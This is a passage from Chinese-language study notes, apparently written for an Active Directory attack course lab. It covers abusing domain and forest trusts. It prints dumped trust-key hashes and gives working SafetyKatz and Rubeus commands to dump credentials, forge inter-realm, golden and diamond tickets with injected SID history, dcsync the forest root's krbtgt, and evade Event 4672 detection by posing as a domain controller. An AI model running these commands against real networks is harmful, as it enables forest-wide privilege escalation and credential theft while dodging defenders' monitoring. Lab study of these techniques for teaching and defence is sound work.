class="number">67</span> <span class="number">14</span> <span class="number">2</span>a <span class="number">10</span> <span class="number">08</span> <span class="number">0</span>e <span class="number">0</span>e <span class="number">4</span>b <span class="number">66</span> d2 <span class="number">76</span> <span class="number">21</span> <span class="number">4</span>d d9 <span class="number">16</span> f0 <span class="number">17</span> <span class="number">75</span> <span class="number">81</span> <span class="built_in">ac</span> bb <span class="number">16</span> d0 <span class="number">78</span> <span class="number">38</span> <span class="number">74</span> <span class="number">48</span> <span class="number">79</span> a4 d6 <span class="number">29</span></span><br><span class="line">        * aes256_hmac       <span class="number">4</span>ca93b067f19cf921427713b0e7647c4966f892ec4fe5d32b624d66a71d52b9d</span><br><span class="line">        * aes128_hmac       <span class="number">3</span>c2a40be2ae0927d1a5f94d56a47fa1d</span><br><span class="line">        * rc4_hmac_nt       e83dbf0e81faf41fee25704eb60b4f26</span><br><span class="line"></span><br><span class="line"> [ <span class="type">Out</span> ] MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">    * <span class="number">5</span>/<span class="number">15</span>/<span class="number">2025</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">51</span> PM - <span class="built_in">CLEAR</span>   - f3 <span class="number">52</span> <span class="number">1</span>c <span class="number">24</span> <span class="number">86</span> <span class="number">41</span> <span class="number">2</span>a fb <span class="number">4</span>b <span class="number">8</span>f <span class="number">52</span> c0 e0 <span class="number">23</span> <span class="number">26</span> <span class="number">88</span> e8 <span class="number">44</span> <span class="number">90</span> <span class="number">36</span> <span class="number">60</span> b8 <span class="number">24</span> f1 <span class="number">52</span> <span class="number">70</span> <span class="number">7</span>b <span class="number">7</span>b <span class="number">68</span> ea <span class="number">5</span>e d6 <span class="number">20</span> <span class="number">09</span> <span class="number">60</span> af <span class="number">80</span> e6 <span class="number">08</span> <span class="number">4</span>d a3 <span class="number">3</span>c <span class="number">0</span>d <span class="number">96</span> a7 <span class="number">43</span> d2 <span class="number">57</span> f0 bf <span class="number">09</span> cf a3 a2 e2 <span class="number">58</span> fa <span class="number">13</span> <span class="number">6</span>b d7 <span class="number">11</span> <span class="number">60</span> <span class="number">3</span>f db <span class="number">32</span> f7 <span class="number">77</span> <span class="number">1</span>e a6 <span class="number">12</span> <span class="number">8</span>e <span class="number">61</span> <span class="number">18</span> <span class="number">7</span>b <span class="number">04</span> <span class="number">86</span> <span class="number">12</span> <span class="number">14</span> d8 <span class="number">68</span> <span class="number">49</span> b9 <span class="number">9</span>d fb <span class="number">53</span> <span class="number">9</span>a <span class="number">0</span>b <span class="number">86</span> c3 <span class="number">06</span> <span class="number">40</span> <span class="number">50</span> <span class="number">16</span> b4 <span class="number">20</span> <span class="number">9</span>f d1 c4 bb f7 d2 a0 <span class="number">25</span> <span class="number">36</span> <span class="number">9</span>e <span class="number">42</span> ad <span class="number">3</span>b <span class="number">5</span>d d5 <span class="number">38</span> <span class="number">05</span> <span class="number">6</span>b <span class="number">43</span> <span class="number">4</span>c <span class="number">5</span>a <span class="number">5</span>b <span class="number">12</span> <span class="number">8</span>a <span class="number">2</span>c <span class="number">27</span> <span class="number">8</span>f <span class="number">70</span> <span class="number">35</span> <span class="number">29</span> aa de <span class="number">49</span> <span class="built_in">ac</span> <span class="number">36</span> be ab c8 <span class="number">18</span> <span class="number">37</span> <span class="number">11</span> <span class="number">0</span>c <span class="number">9</span>f <span class="number">30</span> <span class="number">28</span> <span class="number">3</span>b <span class="number">00</span> <span class="number">4</span>f d4 c2 <span class="number">64</span> <span class="number">07</span> <span class="number">5</span>e <span class="number">8</span>b ba f4 fa aa c4 <span class="number">37</span> <span class="number">07</span> de <span class="number">11</span> e9 f8 a8 c1 <span class="number">88</span> e2 ed dd <span class="number">37</span> f7 <span class="number">70</span> f2 <span class="number">72</span> <span class="number">07</span> <span class="number">7</span>c <span class="number">0</span>f <span class="number">89</span> <span class="number">58</span> <span class="number">13</span> e6 <span class="number">58</span> f8 <span class="number">21</span> <span class="number">2</span>f <span class="number">77</span> <span class="number">2</span>f c7 <span class="number">6</span>a <span class="number">80</span> <span class="number">1</span>e <span class="number">4</span>e f3 <span class="number">5</span>e <span class="number">96</span> <span class="number">8</span>b c3 <span class="number">56</span> fe <span class="number">5</span>a e7 <span class="number">3</span>e f6 <span class="number">65</span> <span class="number">57</span> b5 <span class="number">1</span>b d0 <span class="number">78</span> <span class="number">8</span>c <span class="number">22</span> <span class="number">73</span> ca c8 <span class="number">76</span> <span class="number">87</span> <span class="number">87</span> <span class="number">8</span>c e8 ad <span class="number">77</span> <span class="number">77</span> <span class="number">47</span> fb <span class="number">45</span> <span class="number">7</span>f c3 <span class="number">23</span> <span class="number">5</span>b <span class="number">89</span> c0 <span class="number">1</span>d <span class="number">5</span>e <span class="number">62</span> <span class="number">3</span>b <span class="number">04</span> ca e5 <span class="number">67</span> <span class="number">95</span> <span class="number">3</span>e <span class="number">74</span> ef</span><br><span class="line">        * aes256_hmac       <span class="number">4</span>c5b8e9d3b9077ec7c84e6363ae3704c9697d3680988fdcac3756d342b7cbae4</span><br><span class="line">        * aes128_hmac       <span class="number">4</span>c4cb1461c1bc1ceb25244864b098dab</span><br><span class="line">        * rc4_hmac_nt       <span class="number">260</span>f006c71e9cf71db60c83aacea60d9</span><br><span class="line"></span><br><span class="line"> [ <span class="type">In</span>-<span class="number">1</span>] DOLLARCORP.MONEYCORP.LOCAL -&gt; MONEYCORP.LOCAL</span><br><span class="line">    * <span class="number">1</span>/<span class="number">6</span>/<span class="number">2025</span> <span class="number">1</span>:<span class="number">22</span>:<span class="number">20</span> AM - <span class="built_in">CLEAR</span>   - <span class="number">94</span> <span class="number">36</span> <span class="number">4</span>d <span class="number">5</span>e <span class="number">49</span> c5 <span class="number">16</span> c0 <span class="number">39</span> <span class="number">35</span> <span class="number">4</span>b bc <span class="number">36</span> f4 b6 <span class="number">41</span> d2 <span class="number">21</span> <span class="number">46</span> dd e9 <span class="number">2</span>b <span class="number">0</span>f de e5 <span class="number">01</span> ef <span class="number">9</span>d <span class="number">1</span>d <span class="number">5</span>b fe <span class="number">53</span> <span class="built_in">ac</span> ef <span class="number">93</span> e5 <span class="number">77</span> <span class="number">55</span> <span class="number">61</span> <span class="number">7</span>b <span class="number">64</span> <span class="number">2</span>f dd a9 <span class="number">81</span> <span class="number">26</span> fd c3 d8 <span class="built_in">ac</span> <span class="number">0</span>f <span class="number">05</span> <span class="number">9</span>b <span class="number">12</span> <span class="number">1</span>a de <span class="number">72</span> ff <span class="number">6</span>c <span class="number">2</span>d <span class="number">12</span> d8 <span class="number">99</span> c1 <span class="number">9</span>c a4 <span class="number">87</span> <span class="number">4</span>c c0 <span class="number">77</span> <span class="number">17</span> cf <span class="number">6</span>e <span class="number">6</span>e <span class="number">85</span> <span class="number">7</span>e <span class="number">6</span>c d0 <span class="number">2</span>f f1 fe <span class="number">8</span>f a8 <span class="number">23</span> <span class="number">32</span> <span class="number">7</span>a <span class="number">86</span> <span class="number">36</span> <span class="number">9</span>f <span class="number">3</span>d <span class="number">8</span>c be <span class="number">05</span> <span class="number">1</span>a <span class="number">72</span> <span class="number">10</span> <span class="number">33</span> <span class="number">95</span> <span class="number">53</span> <span class="number">98</span> <span class="number">2</span>a <span class="number">82</span> <span class="number">14</span> <span class="number">44</span> fe ca ca <span class="number">00</span> <span class="number">04</span> e3 eb <span class="number">46</span> <span class="number">98</span> a8 f5 <span class="number">17</span> be c9 e4 <span class="number">2</span>c <span class="number">49</span> <span class="number">1</span>d <span class="number">9</span>c a2 <span class="number">75</span> e6 <span class="number">6</span>f <span class="number">2</span>f bb c8 <span class="number">0</span>f d3 <span class="number">7</span>b <span class="number">54</span> <span class="number">6</span>a a1 <span class="number">80</span> a3 <span class="number">8</span>a b5 fb e2 <span class="number">1</span>d <span class="number">06</span> f5 <span class="number">28</span> <span class="number">29</span> ad <span class="number">5</span>f de aa <span class="number">53</span> dc <span class="built_in">ac</span> e7 <span class="number">81</span> cc <span class="number">48</span> <span class="number">15</span> <span class="number">6</span>c d6 <span class="number">67</span> a9 <span class="number">5</span>b <span class="number">2</span>e <span class="number">23</span> <span class="number">09</span> <span class="number">1</span>b <span class="number">14</span> bd <span class="number">5</span>e ea b6 <span class="number">59</span> ff <span class="number">79</span> <span class="number">10</span> cf e2 <span class="number">1</span>d <span class="number">53</span> b2 b4 bc <span class="number">39</span> <span class="number">62</span> e9 <span class="number">7</span>a <span class="built_in">ac</span> <span class="number">06</span> <span class="number">87</span> bf <span class="number">33</span> b8 <span class="number">8</span>d <span class="number">15</span> <span class="number">62</span> ba <span class="number">52</span> <span class="number">22</span> <span class="number">3</span>b <span class="number">7</span>c <span class="number">31</span> <span class="number">64</span> e0 af <span class="number">47</span> <span class="number">99</span> <span class="number">12</span> <span class="number">0</span>d db <span class="number">55</span> a2 <span class="number">2</span>f bd <span class="number">80</span> a8 da <span class="number">4</span>b ee d6 <span class="number">6</span>e bf <span class="number">7</span>d <span class="number">22</span> bd <span class="number">90</span> cf <span class="number">63</span> d6 <span class="number">59</span> <span class="number">07</span> b0 a5 <span class="number">58</span> a9 <span class="number">86</span> <span class="number">5</span>b <span class="number">36</span> <span class="number">24</span></span><br><span class="line">        * aes256_hmac       e4c3e6a1de5623452602b36f91ee21d6495c392e99620e291ed79f0023e3c8ed</span><br><span class="line">        * aes128_hmac       c9475cb8055e6482bb46122747da643e</span><br><span class="line">        * rc4_hmac_nt       <span class="number">62565330</span>cc0627ff58e71fa81364078e</span><br><span class="line"></span><br><span class="line"> [<span class="built_in">Out-1</span>] MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">    * <span class="number">5</span>/<span class="number">15</span>/<span class="number">2025</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">51</span> PM - <span class="built_in">CLEAR</span>   - <span class="number">30</span> <span class="number">31</span> <span class="number">66</span> <span class="number">09</span> <span class="number">73</span> <span class="number">74</span> <span class="number">16</span> df <span class="number">92</span> <span class="number">03</span> <span class="number">12</span> <span class="number">0</span>c <span class="number">77</span> <span class="number">7</span>e <span class="number">67</span> fe <span class="number">71</span> <span class="number">7</span>d c0 <span class="number">48</span> <span class="number">20</span> <span class="number">20</span> <span class="number">8</span>f <span class="number">67</span> <span class="number">9</span>c de f6 <span class="number">8</span>e <span class="number">87</span> <span class="number">7</span>f <span class="number">6</span>b <span class="number">00</span> <span class="number">1</span>b e2 d7 <span class="number">46</span> <span class="number">5</span>a <span class="number">3</span>b <span class="number">24</span> df <span class="number">0</span>c <span class="number">84</span> <span class="number">4</span>e cc <span class="number">54</span> <span class="number">5</span>d <span class="number">39</span> <span class="number">6</span>f <span class="number">79</span> <span class="number">9</span>e d6 <span class="number">94</span> f4 de <span class="number">94</span> <span class="number">3</span>b e6 b9 <span class="number">06</span> <span class="number">32</span> <span class="number">72</span> ec <span class="number">93</span> <span class="number">3</span>c <span class="number">28</span> a8 <span class="number">3</span>d b4 d4 <span class="built_in">fc</span> c3 d1 <span class="number">83</span> <span class="number">37</span> <span class="number">72</span> d4 <span class="number">6</span>c <span class="number">2</span>d <span class="number">56</span> c2 <span class="number">8</span>e <span class="built_in">fc</span> <span class="number">3</span>c c6 <span class="number">8</span>b <span class="number">81</span> be <span class="number">1</span>f <span class="number">1</span>b c6 b8 <span class="number">7</span>a <span class="number">88</span> <span class="built_in">fc</span> be <span class="number">90</span> <span class="number">21</span> <span class="number">61</span> <span class="number">93</span> <span class="number">6</span>d dc <span class="number">16</span> <span class="number">10</span> <span class="number">4</span>f c8 b5 <span class="number">66</span> d6 ec <span class="number">67</span> a3 df <span class="number">93</span> e8 <span class="number">38</span> d0 c1 <span class="number">5</span>d <span class="number">94</span> b5 <span class="number">4</span>b <span class="number">04</span> <span class="number">3</span>e ef <span class="number">9</span>a <span class="number">3</span>b <span class="number">3</span>b b6 <span class="number">5</span>e <span class="number">46</span> c6 <span class="number">2</span>c ef <span class="number">27</span> <span class="number">7</span>e <span class="number">7</span>b eb <span class="number">26</span> <span class="number">74</span> <span class="number">9</span>a <span class="number">30</span> <span class="number">8</span>a <span class="number">60</span> <span class="number">98</span> <span class="number">53</span> <span class="number">5</span>a <span class="number">50</span> <span class="number">48</span> ad <span class="number">5</span>d <span class="number">95</span> da <span class="number">7</span>f <span class="number">27</span> <span class="number">23</span> <span class="number">44</span> <span class="number">71</span> <span class="number">72</span> <span class="number">59</span> <span class="number">1</span>d <span class="number">32</span> f6 <span class="number">12</span> <span class="number">25</span> <span class="number">95</span> ee <span class="number">84</span> <span class="number">59</span> <span class="number">67</span> <span class="number">85</span> <span class="number">2</span>b <span class="number">87</span> <span class="number">2</span>d ba e9 e6 <span class="number">6</span>f cc <span class="number">96</span> <span class="number">2</span>f <span class="number">23</span> fe <span class="number">69</span> <span class="number">91</span> b4 dd <span class="number">12</span> <span class="number">9</span>b ad <span class="built_in">fc</span> f5 <span class="number">58</span> <span class="number">67</span> <span class="number">47</span> a1 <span class="number">35</span> <span class="number">59</span> f4 <span class="number">5</span>c <span class="built_in">fc</span> <span class="number">6</span>e <span class="number">43</span> a2 <span class="number">6</span>a <span class="number">01</span> <span class="number">85</span> af <span class="number">3</span>c b4 <span class="number">02</span> ad <span class="number">70</span> fd <span class="number">67</span> c4 af <span class="number">47</span> <span class="number">54</span> <span class="number">8</span>d d2 ca b9 <span class="number">18</span> <span class="number">2</span>b e1 <span class="number">00</span> <span class="number">0</span>a <span class="number">60</span> f7 f0 <span class="number">2</span>e <span class="number">50</span> <span class="number">45</span> <span class="number">06</span> <span class="number">1</span>e <span class="number">3</span>e f0 a5 c4 <span class="number">71</span></span><br><span class="line">        * aes256_hmac       <span class="number">8</span>b23be5891f4a96980e3bdeacdc7d1dc272b5a0246f29d1acd20464bda39bd1a</span><br><span class="line">        * aes128_hmac       <span class="number">19</span>d86e57776bf757fb6c9967ab05dbdf</span><br><span class="line">        * rc4_hmac_nt       <span class="number">0961</span>f3581bc0187c3dc497ab305cb036</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>在域控上导出当前域内所有域凭证，其中会包含 <code>trust key</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKtz.exe &quot;lsadump::lsa /patch&quot;</span><br></pre></td></tr></table></figure>

<h6 id="1-确定域信任账号"><a href="#1-确定域信任账号" class="headerlink" title="1.确定域信任账号"></a>1.确定域信任账号</h6><p>可以通过下面的特征来确认域信任账户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 账户为机器账户即$结尾</span></span><br><span class="line"></span><br><span class="line">samaccounttype=TRUST_ACCOUNT</span><br><span class="line"></span><br><span class="line">useraccountcontrol=INTERDOMAIN_TRUST_ACCOUNT</span><br></pre></td></tr></table></figure>

<p>通过这个特征来筛选，即可得出如下几个域名的域信任账户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; Get-DomainObject|?&#123;$_.samaccounttype -match &quot;TRUST_ACCOUNT&quot;&#125;|select name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line">----</span><br><span class="line">ecorp$</span><br><span class="line">mcorp$</span><br><span class="line">US$</span><br></pre></td></tr></table></figure>

<h5 id="2-利用信任密钥伪造跨域TGT"><a href="#2-利用信任密钥伪造跨域TGT" class="headerlink" title="2.利用信任密钥伪造跨域TGT"></a>2.利用信任密钥伪造跨域TGT</h5><p>因为跨域TGT是使用信任密钥加密的，反过来这里也可以用信任密钥伪造第5步用的跨域TGT，并在里面注入<code>sid history</code>属性。</p>
<p>信任密钥被存在<code>信任账户</code>账户中，<code>信任账户</code>被视为一个<code>机器账户</code>，在双方域控都同意的情况他的密钥每过三十天轮换一次（所以不如krbtgt那么持久）。</p>
<p>（这里Rubeus的选项是silver，我感觉应该是因为是由 <code>域信任账户</code> 的 <code>信任密钥</code> 伪造的 <code>跨域TGT票据</code> ，有点类似用<code>ap-req</code>阶段使用 <code>服务凭据</code> 伪造 <code>ST</code> ，于是给塞到了 <code>silver</code> 里）</p>
<p><strong>伪造时候要注意，是本域krbtgt服务下发这张跨域TGT票的</strong></p>
<p>伪造跨域TGT，并注入目标域的企业管理员sid到sid history属性。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:&lt;trust key(NThash)&gt; /sid:&lt;当前domain sid&gt; /sids:&lt;目标域-企业管理员sid 例:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span>&gt; /ldap /user:Administrator /nowarp </span><br></pre></td></tr></table></figure>

<p>使用伪造的<code>跨域TGT(referral TGT )</code>请求目标域的目标服务ST，将返回的ST注入到当前进程</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs /service:http/mcorp<span class="literal">-dc</span>.MONEYCORP.LOCAL /dc:mcorp<span class="literal">-dc</span>.MONEYCORP.LOCAL /ptt /ticket:&lt;上一步的跨域TGT&gt;</span><br></pre></td></tr></table></figure>

<p>然后就可以winrs访问到另一个域的目标服务了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:dcorp<span class="literal">-dc</span>.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>再say一次，对面DC只验证这张票能否被跨域信任密钥解密，能解密DC就认为票据没问题。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>silver</code></td>
<td>使用 Rubeus 的 Silver Ticket 模块</td>
</tr>
<tr>
<td><code>/rc4:17e8f4d3f4b46e95048a66a5dd890ee3</code></td>
<td>NTLM 哈希（krbtgt 或服务账户的密钥）这里用的则是信任密钥</td>
</tr>
<tr>
<td><code>/sid:S-1-5-21-719815819-37263689483917688648</code></td>
<td>当前伪造用户所在的目标域 SID</td>
</tr>
<tr>
<td><code>/sids:S-1-5-21-335606122-960912869-3279953914-519</code></td>
<td>父域中 Enterprise Admins 组的 SID（提升权限）</td>
</tr>
<tr>
<td><code>/ldap</code></td>
<td>向当前域控请求 PAC 信息</td>
</tr>
<tr>
<td><code>/user:Administrator</code></td>
<td>要伪造的用户名</td>
</tr>
<tr>
<td><code>/nowrap</code></td>
<td>输出不换行（适用于脚本处理或直接注入）</td>
</tr>
</tbody></table>
<p>要注意的是在做跨域攻击的时候，如果目标不是森林根域（最高层），那么也可以先给攻击对象（用户&#x2F;组）注入域管理员组的SID历史（512表示Domain Admins的RID），这样就获得了目标域管理员权限。在到达林根时，可以注入企业管理员的SID历史，获得更高级权限。</p>
<p>所以可以看下域林</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADForest</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-利用当前域krbtgt-key-伪造TGT并注入-sid-history（等同构造金票时候里面加个sid-history属性）"><a href="#3-利用当前域krbtgt-key-伪造TGT并注入-sid-history（等同构造金票时候里面加个sid-history属性）" class="headerlink" title="3.利用当前域krbtgt key 伪造TGT并注入 sid history（等同构造金票时候里面加个sid history属性）"></a>3.利用当前域krbtgt key 伪造TGT并注入 <code>sid history</code>（等同构造金票时候里面加个sid history属性）</h5><p>这种比上一种方便许多，不用再拿着跨域TGT挨个再请求服务票（ST）了。</p>
<p>就在本域伪造个金票，然后多注入一个sid history属性就行，后面本域DC发现要请求的资源是其他域的，于是在DC去生成跨域TGT的时候，会用到本来的TGT，所以自然会把注入的sid history给带进去。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&quot;kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:&lt;当前域SID&gt; /sids:&lt;目标域+伪造角色的RID 例:S-1-5-21-335606122-960912869-3279953914-519&gt; /krbtgt:xxxxxxxxx /ptt&quot;</span> <span class="string">&quot;exit&quot;</span> </span><br></pre></td></tr></table></figure>

<p>然后直接访问目标域的服务就ok</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:mcorp<span class="literal">-dc</span> cmd</span><br></pre></td></tr></table></figure>

<h5 id="4-检测点绕过"><a href="#4-检测点绕过" class="headerlink" title="4.检测点绕过"></a>4.检测点绕过</h5><p>当在林根域DC告警中看到有一个来自子域的账户触发了4672（有一个有企业管理员权限或域管权限的账户进行登陆了），说明有人以高权身份跨域过来了。</p>
<p>这里课程中提供了一种思路，当一个来自子域的用户伪造跨域的域管或企业管理员身份会被检测到，但如果一个子域的域控，伪造目标域的域控组和企业管理组的身份发起访问对则不会被轻易检测到。</p>
<p><del>这就像来自乡下的我进京怎么装都会被察觉到贫穷的气息，但如果是我们乡长进京那怎么装b都难以被察觉出破绽，那高低也算是个人物（x</del></p>
<p>所以，这里伪造金票的用户要用本域的dc，所以要加域控的id，因为是机器账户所以注入的 <code>sid history</code> 则是目标域的域控组(<code>516</code>)和企业管理控制器组(<code>S-1-5-9</code>)</p>
<p>mimikatz</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&quot;kerberos::golden /user:dcorp-dc<span class="variable">$</span> /id:1000 /domain:dollarcorp.moneycorp.local /sid:s-1-5-21-7198158193726368948-3917688648 /sids:s-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<p>Rubeus</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe golden /user:dcorp<span class="literal">-dc</span><span class="variable">$</span> /id:<span class="number">1000</span> /domain:dollarcorp.moneycorp.local /aes256:xxxxxxxxxx /sid:s<span class="literal">-1-5-21-7198158193726368948-3917688648</span> /sids:s<span class="literal">-1-5-21-335606122-960912869-3279953914-516</span>,S<span class="literal">-1-5-9</span> /dc:DCORP<span class="literal">-DC</span>.dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>

<h6 id="钻石票"><a href="#钻石票" class="headerlink" title="钻石票"></a>钻石票</h6><p>和正常流程中的票据完整度一样，同样这里钻石票自然要比金票在流程上更不容易被检出。站在简易度和opsec的角度钻石票应该是最优解（蓝宝石票需要先去获得一个合法pac，流程会变长许多）</p>
<p>Rubeus</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:xxxxx /tgtdeleg /enctype:aes /ticketuser:dcorp<span class="literal">-dc</span><span class="variable">$</span> /domain:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /ticketuserid:<span class="number">1000</span> /sids:s<span class="literal">-1-5-21-335606122-960912869-3279953914-516</span>,S<span class="literal">-1-5-9</span>&lt;目标域控组和域企业控制组&gt; /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<hr>
<p>但要注意，以本域域控伪造跨域的域控组权限之后，为了避免被检测到诡异的异常行为，不能以交互式的方式（比如winrs等）登录到林根的任何机器，建议是执行dcsync，域控之间dcsync这很正常(任何一个域用户执行dcsync都会显得异常)，所以这样就可以绕过日志监测。</p>
<p>dcsync</p>
<p>powershell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe &quot;lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<h3 id="11，跨外部信任（林）域-Across-External-Trust"><a href="#11，跨外部信任（林）域-Across-External-Trust" class="headerlink" title="11，跨外部信任（林）域 Across External Trust"></a>11，跨外部信任（林）域 Across External Trust</h3><p>在两个林中存在sid过滤机制，具体表现为在跨信任域或跨林流程时，跨域TGT票据中的 <code>sid history</code> 字段如果sid是500-1000，第5步发送给对面域林的DC时这个字段将会被抹除，尽管票据被验证为合法的仍可以正常使用，但是无法伪造sid history了。</p>
<p>除非对面域林配置错了一个1104的域企业管理员组，那此时 <code>sid history</code> 可以伪造一个1104，因为不在500-1000，所以这不会被过滤（笑</p>
<h4 id="1-可利用点"><a href="#1-可利用点" class="headerlink" title="1.可利用点"></a>1.可利用点</h4><p>而且跨外部信任的域，无法直接用初始TGT进行交互后面的交互，要直接去做跨域TGT，然后指定tgs请求票据，挨个服务尝试。</p>
<p>如果在明确了另一个林域给了一个可访问资源，并限制了本域访问可访问的用户，那就可以利用，尽管很有限。</p>
<p>比如 <code>eurocorp.local</code> 域的DC共享了一个 <code>SharedwithDCorp</code> 网络文件夹，并且这个只给当前我们所处域 <code>dollarcorp.moneycorp.local</code> 的DA（域管）权限访问。</p>
<p>提取跨域密钥</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&quot;lsadump::dcsync /user:dcorp\eucorp<span class="variable">$</span>&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<p>先用刚才在同一个林中交互的跨域TGT伪造的命令，看下区别</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:&lt;trust key(NThash)&gt; /sid:&lt;当前domain sid&gt; /sids:&lt;目标域-企业管理员sid 例:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span>&gt; /ldap /user:Administrator /nowarp </span><br></pre></td></tr></table></figure>

<p>当使用信任密钥，伪造了这个跨域TGT票据，会发现即便是知道要删，但是上面命令中写入了企业管理员的sid history（为了演示 XD）</p>
<p>把tgt发过去做 <code>tgs-req</code> </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs service:cifs/eucorp<span class="literal">-dc</span>.eurocorp.local /dc:eucorp<span class="literal">-dc</span>.eurocorp.loca /ptt/ticket:&lt;FORGED TICKET&gt;</span><br></pre></td></tr></table></figure>

<p>对面林DC在接到tgt后，会解密票据并直接删掉 跨域TGT 其中的 <code>sid history</code> 部分，甚至对面DC的日志中会有一条记录，记录sids已被删除。</p>
<p>所以这个sids如果在1000以内的话，跨林时候sids其实就没啥必要带了，<strong>所以能做的只是以当前域的管理员身份访问</strong>。</p>
<p>直接用下面命令单纯伪造一个本域的域管的跨域TGT就好</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:&lt;trust key(NThash)&gt; /sid:&lt;当前domain sid&gt;  /ldap /user:Administrator /nowarp </span><br></pre></td></tr></table></figure>

<p>所以那其实直接伪造个金票，拿域管理员去访问可能会更方便些。</p>
<h4 id="2-枚举资源服务"><a href="#2-枚举资源服务" class="headerlink" title="2.枚举资源服务"></a>2.枚举资源服务</h4><p>和刚才一样，因为无法得知另一个林域内机器开启了什么样的服务，只能挨个机器挨个服务枚举。</p>
<p>比如刚才拿到了 <code>eucorp-dc.eurocorp.local</code> ，只能访问一个目录 <code>SharedwithDCorp</code> ，当访问 <code>c$</code> 都会被拒绝</p>
<p>可以通过 <code>net view</code> 来看有哪些</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view \\eudcorp.eurocorp.local\</span><br></pre></td></tr></table></figure>

<p>如果要枚举对面林中某哥机器是否有能用的服务，就需要修改下面这个中的 <code>服务</code> 和 <code>机器名</code>，然后不断的请求不断地枚举尝试…</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs service:cifs/eucorp<span class="literal">-dc</span>.eurocorp.local /dc:eucorp<span class="literal">-dc</span>.eurocorp.loca /ptt/ticket:&lt;FORGED TICKET&gt;</span><br></pre></td></tr></table></figure>

<p>因为资源对于我们而言不是明确的，而且林与林之间资源的分享都是需要手动配置，配置的都是还是最小化的资源单位，比如smb可能只会共享一个目录，在没有文档或者别的提示的情况下，就连这个机器上的cifs服务也需要手动枚举才能发现，“这个机器给我共享了一个cifs”。</p>
<hr>
<h2 id="10-ADCS"><a href="#10-ADCS" class="headerlink" title="10 ADCS"></a>10 ADCS</h2><p>adcs是 <code>Active directory 证书服务</code>，是微软对于PKI（一种公钥设施）的一种实现。</p>
<p>adcs 可以用对用户、机器做身份认证，给电子邮件签名加密和签名邮件等等</p>
<p>在微软文档中，他介绍ADCS被视作一个服务器角色，相当于构建一个pki设施，为组织提供公钥加密、数字证书、数字签名等功能。</p>
<p>这涉及到一些概念：</p>
<ul>
